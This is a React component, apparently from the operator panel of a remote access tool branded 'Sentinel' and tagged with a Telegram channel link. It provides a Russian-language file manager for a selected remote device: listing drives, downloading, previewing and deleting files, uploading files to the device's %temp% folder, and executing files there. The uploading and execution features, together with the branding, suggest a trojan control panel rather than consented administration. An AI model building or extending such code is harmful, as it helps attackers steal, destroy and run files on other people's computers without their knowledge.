// t.me/SentinelLinks

"use client"

import type React from "react"
import { useState, useEffect, useRef } from "react"
import { Button } from "@/components/ui/button"
import {
  Folder,
  File,
  Download,
  Upload,
  Trash2,
  Search,
  Home,
  ChevronRight,
  ChevronUp,
  Play,
  Loader2,
  CheckCircle,
  X,
  Eye,
  FileText,
  ImageIcon,
  FileCode,
  RefreshCw,
  AlertCircle,
  HardDrive,
} from "lucide-react"
import type { User } from "@/app/page"
import { Card } from "@/components/ui/card"
import { Input } from "@/components/ui/input"
import { toast } from "sonner"
import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog"

// t.me/SentinelLinks
interface FileItem {
  id: string
  name: string
  type: "folder" | "file"
  size?: string
  modified: string
  path?: string
}

interface UploadedFile {
  id: string
  name: string
  size: string
  status: "ready" | "uploading" | "uploaded" | "running" | "error"
}

interface FilesTabProps {
  selectedUser: User | null
}

export function FilesTab({ selectedUser }: FilesTabProps) {
  const [currentPath, setCurrentPath] = useState("C:\\")
  const [searchQuery, setSearchQuery] = useState("")
  const [files, setFiles] = useState<FileItem[]>([])
  const [isLoading, setIsLoading] = useState(false)
  const [uploadedFiles, setUploadedFiles] = useState<UploadedFile[]>([])
  const [isDragging, setIsDragging] = useState(false)
  const [showUploadPanel, setShowUploadPanel] = useState(false)
  const fileInputRef = useRef<HTMLInputElement>(null)

  const [previewFile, setPreviewFile] = useState<{ name: string; content: string; type: string } | null>(null)
  const [isPreviewOpen, setIsPreviewOpen] = useState(false)
  const [downloadingFiles, setDownloadingFiles] = useState<Set<string>>(new Set())
  const [deletingFiles, setDeletingFiles] = useState<Set<string>>(new Set())
  const [connectionError, setConnectionError] = useState<string | null>(null)

  const [availableDrives, setAvailableDrives] = useState<string[]>(["C:", "D:"])

  useEffect(() => {
    if (selectedUser) {
      loadFiles(currentPath)
    }
  }, [selectedUser, currentPath])

  const loadFiles = async (path: string) => {
    if (!selectedUser) return

    setIsLoading(true)
    setConnectionError(null)

    try {
      const controller = new AbortController()
      const timeoutId = setTimeout(() => controller.abort(), 10000)

      const response = await fetch("/api/files", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "X-Client-Id": selectedUser.id,
        },
        body: JSON.stringify({
          clientId: selectedUser.id,
          action: "list",
          path: path,
        }),
        signal: controller.signal,
      })

      clearTimeout(timeoutId)

      const data = await response.json()

      if (response.ok && data.success) {
        const parsedFiles: FileItem[] = (data.files || []).map((file: any, index: number) => ({
          id: file.id || `file-${index}-${Date.now()}`,
          name: file.name || "Unknown",
          type: file.type || (file.isDirectory ? "folder" : "file"),
          size: file.size || "",
          modified: file.modified || new Date().toISOString(),
          path: file.path || "",
        }))

        setFiles(parsedFiles)
        setConnectionError(null)

        if (path === "C:\\" || path === "") {
          const drives = parsedFiles.filter((f) => f.type === "folder" && /^[A-Z]:$/.test(f.name)).map((f) => f.name)
          if (drives.length > 0) {
            setAvailableDrives(drives)
          }
        }
      } else {
        setFiles([])
        setConnectionError(data.error || "Не удалось загрузить список файлов")
      }
    } catch (error) {
      console.error("Error loading files:", error)
      setFiles([])
      if (error instanceof Error && error.name === "AbortError") {
        setConnectionError("Время ожидания истекло. Клиент не отвечает.")
      } else {
        setConnectionError("Не удалось связаться с устройством. Проверьте подключение.")
      }
    } finally {
      setIsLoading(false)
    }
  }

  const handleDownloadFile = async (file: FileItem, e: React.MouseEvent) => {
    e.stopPropagation()
    if (!selectedUser || file.type === "folder") return

    const filePath = currentPath.endsWith("\\") ? `${currentPath}${file.name}` : `${currentPath}\\${file.name}`

    setDownloadingFiles((prev) => new Set(prev).add(file.id))

    try {
      const response = await fetch("/api/files", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "X-Client-Id": selectedUser.id,
        },
        body: JSON.stringify({
          clientId: selectedUser.id,
          action: "download",
          path: filePath,
        }),
      })

      const data = await response.json()

      if (response.ok && data.success && data.fileData) {
        const binaryString = atob(data.fileData)
        const bytes = new Uint8Array(binaryString.length)
        for (let i = 0; i < binaryString.length; i++) {
          bytes[i] = binaryString.charCodeAt(i)
        }
        const blob = new Blob([bytes])
        const url = URL.createObjectURL(blob)
        const a = document.createElement("a")
        a.href = url
        a.download = data.fileName || file.name
        document.body.appendChild(a)
        a.click()
        document.body.removeChild(a)
        URL.revokeObjectURL(url)

        toast.success("Файл скачан", { description: file.name })
      } else {
        throw new Error(data.error || "Ошибка скачивания")
      }
    } catch (error) {
      console.error("Download error:", error)
      toast.error("Ошибка скачивания", {
        description: error instanceof Error ? error.message : "Неизвестная ошибка",
      })
    } finally {
      setDownloadingFiles((prev) => {
        const next = new Set(prev)
        next.delete(file.id)
        return next
      })
    }
  }

  const handleViewFile = async (file: FileItem, e: React.MouseEvent) => {
    e.stopPropagation()
    if (!selectedUser || file.type === "folder") return

    const filePath = currentPath.endsWith("\\") ? `${currentPath}${file.name}` : `${currentPath}\\${file.name}`

    const ext = file.name.split(".").pop()?.toLowerCase() || ""
    const textExtensions = [
      "txt",
      "log",
      "json",
      "xml",
      "html",
      "css",
      "js",
      "ts",
      "tsx",
      "jsx",
      "md",
      "yaml",
      "yml",
      "ini",
      "cfg",
      "conf",
      "bat",
      "ps1",
      "sh",
      "py",
      "java",
      "c",
      "cpp",
      "h",
      "cs",
      "go",
      "rs",
      "sql",
    ]
    const imageExtensions = ["png", "jpg", "jpeg", "gif", "bmp", "webp", "ico", "svg"]

    if (!textExtensions.includes(ext) && !imageExtensions.includes(ext)) {
      toast.error("Предпросмотр недоступен", { description: "Этот тип файла не поддерживается для просмотра" })
      return
    }

    setDownloadingFiles((prev) => new Set(prev).add(file.id))

    try {
      const response = await fetch("/api/files", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "X-Client-Id": selectedUser.id,
        },
        body: JSON.stringify({
          clientId: selectedUser.id,
          action: "download",
          path: filePath,
        }),
      })

      const data = await response.json()

      if (response.ok && data.success && data.fileData) {
        if (imageExtensions.includes(ext)) {
          setPreviewFile({
            name: file.name,
            content: `data:image/${ext};base64,${data.fileData}`,
            type: "image",
          })
        } else {
          const text = atob(data.fileData)
          setPreviewFile({
            name: file.name,
            content: text,
            type: "text",
          })
        }
        setIsPreviewOpen(true)
      } else {
        throw new Error(data.error || "Ошибка загрузки файла")
      }
    } catch (error) {
      console.error("View error:", error)
      toast.error("Ошибка просмотра", {
        description: error instanceof Error ? error.message : "Неизвестная ошибка",
      })
    } finally {
      setDownloadingFiles((prev) => {
        const next = new Set(prev)
        next.delete(file.id)
        return next
      })
    }
  }

  const handleDeleteFile = async (file: FileItem, e: React.MouseEvent) => {
    e.stopPropagation()
    if (!selectedUser) return

    const filePath = currentPath.endsWith("\\") ? `${currentPath}${file.name}` : `${currentPath}\\${file.name}`

    setDeletingFiles((prev) => new Set(prev).add(file.id))

    try {
      const response = await fetch("/api/files", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "X-Client-Id": selectedUser.id,
        },
        body: JSON.stringify({
          clientId: selectedUser.id,
          action: "delete",
          path: filePath,
        }),
      })

      const data = await response.json()

      if (response.ok && data.success) {
        toast.success("Файл удален", { description: file.name })
        loadFiles(currentPath)
      } else {
        throw new Error(data.error || "Ошибка удаления")
      }
    } catch (error) {
      console.error("Delete error:", error)
      toast.error("Ошибка удаления", {
        description: error instanceof Error ? error.message : "Неизвестная ошибка",
      })
    } finally {
      setDeletingFiles((prev) => {
        const next = new Set(prev)
        next.delete(file.id)
        return next
      })
    }
  }

  const handleRunFileFromExplorer = async (file: FileItem, e: React.MouseEvent) => {
    e.stopPropagation()
    if (!selectedUser || file.type === "folder") return

    const filePath = currentPath.endsWith("\\") ? `${currentPath}${file.name}` : `${currentPath}\\${file.name}`

    try {
      const response = await fetch("/api/files", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "X-Client-Id": selectedUser.id,
        },
        body: JSON.stringify({
          clientId: selectedUser.id,
          action: "execute",
          fileName: filePath,
        }),
      })

      const data = await response.json()

      if (response.ok && data.success) {
        toast.success("Файл запущен", { description: file.name })
      } else {
        throw new Error(data.error || "Ошибка запуска")
      }
    } catch (error) {
      console.error("Run error:", error)
      toast.error("Ошибка запуска", {
        description: error instanceof Error ? error.message : "Неизвестная ошибка",
      })
    }
  }

  const getFileIcon = (fileName: string) => {
    const ext = fileName.split(".").pop()?.toLowerCase() || ""
    const imageExtensions = ["png", "jpg", "jpeg", "gif", "bmp", "webp", "ico", "svg"]
    const codeExtensions = [
      "js",
      "ts",
      "tsx",
      "jsx",
      "py",
      "java",
      "c",
      "cpp",
      "cs",
      "go",
      "rs",
      "html",
      "css",
      "json",
      "xml",
    ]
    const textExtensions = ["txt", "log", "md", "ini", "cfg", "conf"]

    if (imageExtensions.includes(ext)) {
      return <ImageIcon className="w-5 h-5 text-green-500" />
    }
    if (codeExtensions.includes(ext)) {
      return <FileCode className="w-5 h-5 text-blue-500" />
    }
    if (textExtensions.includes(ext)) {
      return <FileText className="w-5 h-5 text-orange-500" />
    }
    return <File className="w-5 h-5 text-muted-foreground" />
  }

  const handleFileSelect = (e: React.ChangeEvent<HTMLInputElement>) => {
    const files = e.target.files
    if (!files || !selectedUser) return
    processFiles(Array.from(files))
  }

  const processFiles = async (fileList: File[]) => {
    if (!selectedUser) return

    setShowUploadPanel(true)

    for (const file of fileList) {
      const newFile: UploadedFile = {
        id: Math.random().toString(36).substr(2, 9),
        name: file.name,
        size: formatFileSize(file.size),
        status: "uploading",
      }

      setUploadedFiles((prev) => [...prev, newFile])

      try {
        const formData = new FormData()
        formData.append("file", file)

// t.me/SentinelLinks
        const response = await fetch("/api/files", {
          method: "POST",
          headers: {
            "X-Client-Id": selectedUser.id,
          },
          body: formData,
        })

        const result = await response.json()

        if (result.success) {
          setUploadedFiles((prev) => prev.map((f) => (f.id === newFile.id ? { ...f, status: "uploaded" as const } : f)))
          toast.success("Файл загружен", { description: `${file.name} загружен в %temp%` })
        } else {
          throw new Error(result.error || "Ошибка загрузки")
        }
      } catch (error) {
        console.error("File upload error:", error)
        setUploadedFiles((prev) => prev.map((f) => (f.id === newFile.id ? { ...f, status: "error" as const } : f)))
        toast.error("Ошибка загрузки", {
          description: error instanceof Error ? error.message : "Неизвестная ошибка",
        })
      }
    }
  }

  const handleDragOver = (e: React.DragEvent) => {
    e.preventDefault()
    setIsDragging(true)
  }

  const handleDragLeave = () => {
    setIsDragging(false)
  }

  const handleDrop = (e: React.DragEvent) => {
    e.preventDefault()
    setIsDragging(false)

    const files = e.dataTransfer.files
    if (files.length > 0) {
      processFiles(Array.from(files))
    }
  }

  const handleRunFile = async (fileId: string) => {
    const file = uploadedFiles.find((f) => f.id === fileId)
    if (!file || !selectedUser) return

    setUploadedFiles((prev) => prev.map((f) => (f.id === fileId ? { ...f, status: "running" as const } : f)))

    try {
      const response = await fetch("/api/files", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "X-Client-Id": selectedUser.id,
        },
        body: JSON.stringify({
          clientId: selectedUser.id,
          action: "execute",
          fileName: file.name,
        }),
      })

      const result = await response.json()

      if (result.success) {
        toast.success("Файл запущен", { description: file.name })
        setTimeout(() => {
          setUploadedFiles((prev) => prev.map((f) => (f.id === fileId ? { ...f, status: "uploaded" as const } : f)))
        }, 2000)
      } else {
        throw new Error(result.error || "Ошибка запуска")
      }
    } catch (error) {
      console.error("File execute error:", error)
      toast.error("Ошибка запуска", {
        description: error instanceof Error ? error.message : "Неизвестная ошибка",
      })
      setUploadedFiles((prev) => prev.map((f) => (f.id === fileId ? { ...f, status: "uploaded" as const } : f)))
    }
  }

  const handleDeleteUploadedFile = (fileId: string) => {
    setUploadedFiles((prev) => prev.filter((f) => f.id !== fileId))
  }

  const formatFileSize = (bytes: number): string => {
    if (bytes === 0) return "0 Bytes"
    const k = 1024
    const sizes = ["Bytes", "KB", "MB", "GB"]
    const i = Math.floor(Math.log(bytes) / Math.log(k))
    return Math.round((bytes / Math.pow(k, i)) * 100) / 100 + " " + sizes[i]
  }

  const getStatusIcon = (status: UploadedFile["status"]) => {
    switch (status) {
      case "uploading":
      case "running":
        return <Loader2 className="w-4 h-4 animate-spin" />
      case "uploaded":
        return <CheckCircle className="w-4 h-4 text-green-500" />
      case "error":
        return <AlertCircle className="w-4 h-4 text-red-500" />
      default:
        return null
    }
  }

  const getStatusText = (status: UploadedFile["status"]) => {
    switch (status) {
      case "uploading":
        return "Загрузка..."
      case "uploaded":
        return "Готов к запуску"
      case "running":
        return "Выполняется..."
      case "error":
        return "Ошибка"
      default:
        return "Готово"
    }
  }

  const navigateToFolder = (folderName: string) => {
    const newPath = currentPath.endsWith("\\") ? `${currentPath}${folderName}` : `${currentPath}\\${folderName}`
    setCurrentPath(newPath)
  }

  const navigateToDrive = (drive: string) => {
    setCurrentPath(`${drive}\\`)
  }

  const getPathSegments = () => {
    const segments = currentPath.split("\\").filter(Boolean)
    return segments
  }

  const navigateToBreadcrumb = (index: number) => {
    const segments = getPathSegments()
    const newPath = segments.slice(0, index + 1).join("\\")
    setCurrentPath(newPath.endsWith(":") ? `${newPath}\\` : newPath)
  }

  const navigateUp = () => {
    const segments = getPathSegments()
    if (segments.length > 1) {
      const newPath = segments.slice(0, -1).join("\\")
      setCurrentPath(newPath.endsWith(":") ? `${newPath}\\` : newPath)
    }
  }

  const filteredFiles = Array.isArray(files)
    ? files.filter((file) => file.name.toLowerCase().includes(searchQuery.toLowerCase()))
    : []

  if (!selectedUser) {
    return (
      <div className="flex-1 flex items-center justify-center bg-background">
        <div className="text-center">
          <div className="w-24 h-24 rounded-2xl bg-gradient-to-br from-primary/20 to-accent/20 flex items-center justify-center mx-auto mb-6">
            <Folder className="w-12 h-12 text-muted-foreground" />
          </div>
          <h3 className="text-xl font-semibold mb-2">Нет подключения</h3>
          <p className="text-muted-foreground">Выберите устройство для доступа к файлам</p>
        </div>
      </div>
    )
  }

  return (
    <div
      className="flex-1 bg-background p-6 overflow-auto"
      onDragOver={handleDragOver}
      onDragLeave={handleDragLeave}
      onDrop={handleDrop}
    >
      <Dialog open={isPreviewOpen} onOpenChange={setIsPreviewOpen}>
        <DialogContent className="max-w-4xl max-h-[80vh]">
          <DialogHeader>
            <DialogTitle className="flex items-center gap-2">
              <Eye className="w-5 h-5" />
              {previewFile?.name}
            </DialogTitle>
          </DialogHeader>
          <div className="overflow-auto max-h-[60vh]">
            {previewFile?.type === "image" ? (
              <img
                src={previewFile.content || "/placeholder.svg"}
                alt={previewFile.name}
                className="max-w-full h-auto mx-auto"
              />
            ) : (
              <pre className="p-4 bg-muted rounded-lg text-sm font-mono whitespace-pre-wrap break-all">
                {previewFile?.content}
              </pre>
            )}
          </div>
        </DialogContent>
      </Dialog>

      {isDragging && (
        <div className="fixed inset-0 z-50 bg-primary/10 border-2 border-dashed border-primary flex items-center justify-center pointer-events-none">
          <div className="text-center">
            <Upload className="w-16 h-16 text-primary mx-auto mb-4" />
            <p className="text-xl font-semibold text-primary">Отпустите файлы для загрузки</p>
          </div>
        </div>
      )}

      <div className="max-w-6xl mx-auto space-y-4">
        {/* Header */}
        <div className="flex items-center justify-between">
          <div>
            <h2 className="text-2xl font-bold bg-gradient-to-r from-primary to-accent bg-clip-text text-transparent">
              Файловый менеджер
            </h2>
            <p className="text-sm text-muted-foreground mt-1">Управление файлами на удаленном ПК</p>
          </div>
          <div className="flex gap-2">
            <input ref={fileInputRef} type="file" multiple onChange={handleFileSelect} className="hidden" />
            <Button variant="outline" size="sm" onClick={() => loadFiles(currentPath)} disabled={isLoading}>
              <RefreshCw className={`w-4 h-4 mr-2 ${isLoading ? "animate-spin" : ""}`} />
              Обновить
            </Button>
            <Button variant="outline" size="sm" onClick={() => fileInputRef.current?.click()}>
              <Upload className="w-4 h-4 mr-2" />
              Загрузить
            </Button>
          </div>
        </div>

        <div className="flex gap-2">
          {availableDrives.map((drive) => (
            <Button
              key={drive}
              variant={currentPath.startsWith(drive) ? "default" : "outline"}
              size="sm"
              onClick={() => navigateToDrive(drive)}
              className="gap-1"
            >
              <HardDrive className="w-3 h-3" />
              {drive}
            </Button>
          ))}
        </div>

        {/* Upload Panel */}
        {showUploadPanel && uploadedFiles.length > 0 && (
          <Card className="p-4 bg-card">
            <div className="flex items-center justify-between mb-3">
              <h3 className="text-sm font-semibold">Загруженные файлы</h3>
              <Button
                variant="ghost"
                size="sm"
                onClick={() => {
                  setUploadedFiles([])
                  setShowUploadPanel(false)
                }}
              >
                <X className="w-4 h-4" />
              </Button>
            </div>
            <div className="space-y-2">
              {uploadedFiles.map((file) => (
                <div key={file.id} className="flex items-center justify-between p-3 rounded-lg bg-muted/50">
                  <div className="flex items-center gap-3 flex-1">
                    <div className="w-8 h-8 rounded-lg bg-muted flex items-center justify-center">
                      <File className="w-4 h-4 text-muted-foreground" />
                    </div>
                    <div className="flex-1 min-w-0">
                      <p className="text-sm font-medium truncate">{file.name}</p>
                      <p className="text-xs text-muted-foreground">
                        {file.size} • {getStatusText(file.status)}
                      </p>
                    </div>
                  </div>
                  <div className="flex items-center gap-2">
                    {getStatusIcon(file.status)}
                    {file.status === "uploaded" && (
                      <Button variant="ghost" size="sm" onClick={() => handleRunFile(file.id)}>
                        <Play className="w-4 h-4" />
                      </Button>
                    )}
                    <Button variant="ghost" size="sm" onClick={() => handleDeleteUploadedFile(file.id)}>
                      <X className="w-4 h-4" />
                    </Button>
                  </div>
                </div>
              ))}
            </div>
          </Card>
        )}

        {/* Navigation */}
        <Card className="p-3 bg-card">
          <div className="flex items-center gap-2">
            <Button variant="ghost" size="icon" onClick={() => setCurrentPath("C:\\")} className="h-8 w-8">
              <Home className="w-4 h-4" />
            </Button>
            <Button variant="ghost" size="icon" onClick={navigateUp} className="h-8 w-8">
              <ChevronUp className="w-4 h-4" />
            </Button>
            <div className="flex-1 flex items-center gap-1 overflow-x-auto">
              {getPathSegments().map((segment, index) => (
                <div key={index} className="flex items-center">
                  {index > 0 && <ChevronRight className="w-4 h-4 text-muted-foreground mx-1" />}
                  <Button
                    variant="ghost"
                    size="sm"
                    onClick={() => navigateToBreadcrumb(index)}
                    className="h-7 px-2 text-sm"
                  >
                    {segment}
                  </Button>
                </div>
              ))}
            </div>
            <div className="relative w-64">
              <Search className="absolute left-2 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground" />
              <Input
                placeholder="Поиск файлов..."
                value={searchQuery}
                onChange={(e) => setSearchQuery(e.target.value)}
                className="pl-8 h-8"
              />
            </div>
          </div>
        </Card>

        {/* Error State */}
        {connectionError && (
          <Card className="p-6 bg-destructive/10 border-destructive/20">
            <div className="flex items-center gap-4">
              <AlertCircle className="w-8 h-8 text-destructive" />
              <div className="flex-1">
                <h3 className="font-semibold text-destructive">Ошибка подключения</h3>
                <p className="text-sm text-muted-foreground">{connectionError}</p>
              </div>
              <Button variant="outline" onClick={() => loadFiles(currentPath)}>
                <RefreshCw className="w-4 h-4 mr-2" />
                Повторить
              </Button>
            </div>
          </Card>
        )}

        {/* Files Grid */}
        <Card className="p-4 bg-card">
          {isLoading ? (
            <div className="flex items-center justify-center py-12">
              <Loader2 className="w-8 h-8 animate-spin text-primary" />
              <span className="ml-3 text-muted-foreground">Загрузка файлов...</span>
            </div>
          ) : filteredFiles.length === 0 && !connectionError ? (
            <div className="text-center py-12">
              <Folder className="w-12 h-12 text-muted-foreground mx-auto mb-4" />
              <p className="text-muted-foreground">Нет файлов для отображения</p>
              <p className="text-sm text-muted-foreground mt-1">Папка пуста или у вас нет доступа к этой директории</p>
            </div>
          ) : (
            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-2">
              {filteredFiles.map((file) => (
                <div
                  key={file.id}
                  className="flex items-center gap-3 p-3 rounded-lg hover:bg-muted/50 cursor-pointer transition-colors group"
                  onClick={() => file.type === "folder" && navigateToFolder(file.name)}
                >
                  <div className="w-10 h-10 rounded-lg bg-muted flex items-center justify-center">
                    {file.type === "folder" ? <Folder className="w-5 h-5 text-yellow-500" /> : getFileIcon(file.name)}
                  </div>
                  <div className="flex-1 min-w-0">
                    <p className="text-sm font-medium truncate">{file.name}</p>
                    <p className="text-xs text-muted-foreground">
                      {file.type === "folder" ? "Папка" : file.size || "Файл"}
                    </p>
                  </div>
                  {file.type === "file" && (
                    <div className="flex gap-1 opacity-0 group-hover:opacity-100 transition-opacity">
                      <Button
                        variant="ghost"
                        size="icon"
                        className="h-7 w-7"
                        onClick={(e) => handleViewFile(file, e)}
                        disabled={downloadingFiles.has(file.id)}
                      >
                        {downloadingFiles.has(file.id) ? (
                          <Loader2 className="w-3 h-3 animate-spin" />
                        ) : (
                          <Eye className="w-3 h-3" />
                        )}
                      </Button>
                      <Button
                        variant="ghost"
                        size="icon"
                        className="h-7 w-7"
                        onClick={(e) => handleDownloadFile(file, e)}
                        disabled={downloadingFiles.has(file.id)}
                      >
                        <Download className="w-3 h-3" />
                      </Button>
                      <Button
                        variant="ghost"
                        size="icon"
                        className="h-7 w-7"
                        onClick={(e) => handleRunFileFromExplorer(file, e)}
                      >
                        <Play className="w-3 h-3" />
                      </Button>
                      <Button
                        variant="ghost"
                        size="icon"
                        className="h-7 w-7 text-destructive"
                        onClick={(e) => handleDeleteFile(file, e)}
                        disabled={deletingFiles.has(file.id)}
                      >
                        {deletingFiles.has(file.id) ? (
                          <Loader2 className="w-3 h-3 animate-spin" />
                        ) : (
                          <Trash2 className="w-3 h-3" />
                        )}
                      </Button>
                    </div>
                  )}
                </div>
              ))}
            </div>
          )}
        </Card>
      </div>
    </div>
  )
}

//  ____             _   _            _
// / ___|  ___ _  | |_(_)_    ___| |   
// \___ \ / _ \ '_ \| | | '_ \ / _ \ | 
//  ___) |  / | | | |_| | | | |  / |   
// |____/ \___|_| |_|\|_|_| |_|\___|_| 
// ********************************    
